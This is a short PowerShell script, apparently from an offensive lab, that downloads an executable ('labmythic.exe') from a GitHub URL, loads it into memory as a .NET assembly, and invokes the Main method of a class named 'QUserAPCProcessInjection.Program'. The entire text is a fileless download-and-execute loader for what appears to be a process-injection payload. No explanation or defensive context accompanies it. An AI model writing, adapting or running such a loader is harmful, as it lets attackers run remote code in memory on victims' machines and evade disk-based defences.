$bytes = (Invoke-WebRequest -useb "https://github.com/chr0n1k/AL2021/blob/main/labmythic.exe?raw=true").Content;
$assembly = [System.Reflection.Assembly]::Load($bytes);
$entryPointMethod = $assembly.GetType('QUserAPCProcessInjection.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
$entryPointMethod.Invoke($null, (, [string[]] ('', '')));
